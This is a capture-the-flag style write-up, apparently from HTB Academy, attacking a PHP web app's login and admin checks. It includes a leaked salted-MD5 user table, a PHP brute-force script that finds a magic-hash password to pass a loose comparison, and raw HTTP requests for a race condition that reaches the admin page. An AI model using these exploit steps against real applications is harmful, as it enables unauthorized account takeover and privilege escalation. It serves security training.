We are asked to test a WIP application that works on the core level.
The webapp is using several user roles like: guest, user, and admin.
The client provides access to a guest user: htb-stdnt:Academy_student.
But also we are provided of a DB leak:
```
+----+-----------+----------------------------------+------+
| id | username  | password                         | role |
+----+-----------+----------------------------------+------+
|  1 | admin     | 0f5ff846bf7ae24489371cd8b7c1a1cd |    0 |
|  2 | vicky     | f179a0139bcdfd8cb317bc909d772872 |    1 |
|  3 | larry     | 0e656540908354891055044945395170 |    1 |
|  4 | ugo       | 076395db88a35e081442b0a4c6b9ce93 |    1 |
|  5 | lastrada  | 76ab196d4b4e5a308da01db9a7d4d451 |    2 |
|  6 | mumble    | 74b6af8dcda692bbc2b37a3e58e3151e |    2 |
|  7 | eris      | 12558e4c0b16815df04a3b1a515df968 |    2 |
|  8 | selby     | cefce2f3409aa1166232e263173a51bc |    2 |
|  9 | eggfox    | 3e41a8f42296e5da59ab6ffd284a738d |    2 |
| 10 | htb-stdnt | 02566311a7d37c5d58456e7d0d39bb78 |    2 |
+----+-----------+----------------------------------+------+
```
And lastly we get access to the code of the backend!

1)I will start by checking if those password can be cracked?
We can see that is is Md5 hashed with a prefixed salt...
```
function pw_hash($password){
    $salt = 'it6z';
    $hash = md5($salt . $password);
    return $hash;
}
```
Unfortunately it isn't happening anything so I will move on!

2)Now we know that the MD5 is used but we know that a Salt is added to the password.
**MD5(it6z+MYPASSWORD)** which means we need to append the string to the rockyou.txt to be able to crack the MD5!
OBS: We need to aim to the users with role 1 atleast which allows us to rech the management portal at least!

We can see the function that is used by the backend to perform a login is using a loose compare:
```
function login($user, $password){
    global $conn;

    $sql = "SELECT * FROM users WHERE username=?;";
    $stmt = mysqli_stmt_init($conn);
    if(!mysqli_stmt_prepare($stmt, $sql)){
        echo "SQL Error";
        exit();
    }

    // execute query
    mysqli_stmt_bind_param($stmt, "s", $user);
    mysqli_stmt_execute($stmt);
    $result = mysqli_stmt_get_result($stmt);

    // check result
    if ($row = mysqli_fetch_assoc($result)) {
        if (pw_hash($password) == $row["password"]){
            return True;
        }
    }
    return False;
}
```
We can use the following script to brute a valid MD5 hash that will eventually pass the loose check!
```
<?php

// Enter your code here, enjoy!
function pw_hash($password){
    $salt = 'it6z';
    $hash = md5($salt . $password);
    return $hash;
}

$hash = '0e656540908354891055044945395170';

for ($x = 0; $x <= 1000000000; $x++) {
  if (pw_hash(strval($x)) == $hash)
	{
    		echo "Found:" . $x;
		echo "\n";
	}
}
?>
```
And this will generate a password that can be used to bypass the login and gain access to the portal as larry!
```
┌──(root㉿kali-bello)-[/home/millycash/Downloads]
└─# php bruter.php 
Found:190565037
```

3)Using the bruted password we can gain access to the portal as Larry user which have role=1 which is user level. This allows us to reach the management portal on the website.
On a first analysis seems like the user management portal allows either to add a new user, or delete... So let's check the code used in the back-end!
The solution here is on the **admin.php** check
```
    // only admins are authorized
    if ($user_data['role'] != 0) {
        header('Location: profile.php');
        exit;
    }
```
Basically if we delete our username and send a request toadmin.php we would get into a RACECONDITION.
So fetch the **/delete** user request:
```
POST /manage.php HTTP/1.1
Host: 83.136.252.32:37592
Content-Length: 7
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://83.136.252.32:37592
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://83.136.252.32:37592/manage.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,fi;q=0.8
Cookie: PHPSESSID=i39cnvr2p0nqhljluoppobcsir
Connection: close

delete=
```
And the get **/admin.php**:
```
GET /admin.php HTTP/1.1
Host: 83.136.252.32:37592
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://83.136.252.32:37592/manage.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,fi;q=0.8
Cookie: PHPSESSID=ujapgnqsrat3m42kgjublev4li
Connection: close
```

4)Next we need to add a new local user that we have control over via Larry's session.
```
POST /manage.php HTTP/1.1
Host: 83.136.252.32:37592
Content-Length: 43
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://83.136.252.32:37592
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://83.136.252.32:37592/manage.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,fi;q=0.8
Cookie: PHPSESSID=m5tf39vfim8vo5t4h3qnc3s61p
Connection: close

username=yovecio&password=yovecio&register=
```

5) Next we need to login to get several valid PHPSESSID sessions:
```
POST /login.php HTTP/1.1
Host: 83.136.252.32:37592
Content-Length: 33
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://83.136.252.32:37592
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://83.136.252.32:37592/login.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,fi;q=0.8
Connection: close

username=yovecio&password=yovecio

Results:m5tf39vfim8vo5t4h3qnc3s61p , ujapgnqsrat3m42kgjublev4li , xxxxxx
```

6)Now we group the DELETE & ADMIN request in the same Burp repeater group. 
Remove the Follow redirection options.
Change the PHPSESSID for the 2 request so we can kick in a race condition. (They must be valid but different, VERY IMPORTANT!).
Choose to send in separate connections in Burp repeater group so the Race Condition can happens.
This should be enough to bypass the **role == 0** and gain access to the admin portal!
**OBS: The reason in because when we delete a user the role=null and null is same as 0!**


**!!THIS was also possible by using turbo intruder, check the script in the same folder(remember to delete the base request and use the both request in the python script!)**